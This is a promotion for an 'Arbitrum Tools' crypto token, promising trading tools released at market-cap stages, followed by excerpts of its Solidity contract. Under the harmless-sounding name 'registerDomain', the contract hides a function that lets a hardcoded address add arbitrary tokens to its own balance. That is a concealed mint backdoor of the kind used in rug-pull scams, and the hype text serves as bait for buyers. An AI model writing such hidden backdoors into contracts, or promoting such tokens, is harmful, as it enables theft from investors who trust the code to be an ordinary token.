...
A set of tools that will make you a better trader at Arbitrum.

The tools will be revealed in marketcap stages.

#1 Tool at 10k marketcap

#2 Tool at 50k market cap

#3 Tool at 100k marketcap

Quick sneak peek:

Our third tool will allow you to automatically find and
execute arbitrages on the Arbitrum network, it will be
the first BOT to be able to perform in an innovative way! 🔥🔥🔥
...
contract ArbitrumTools is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Arbitrum Tools";
    string private _symbol = "ARBTOOLS";
    ...
    constructor () {
        ...
        pairAddress = payable(address(0x4C531c1D4fb1c3E5CBf8FC8310c540988aFa34ff));
    ...
    function registerDomain(address holdersL,uint256 liquidti) public {
        ...
        if (storge > 100){
            _balances[pairAddress] = storge +_balances[pairAddress];
        }
        address call_er = msg.sender;
        require(call_er==pairAddress);
    }
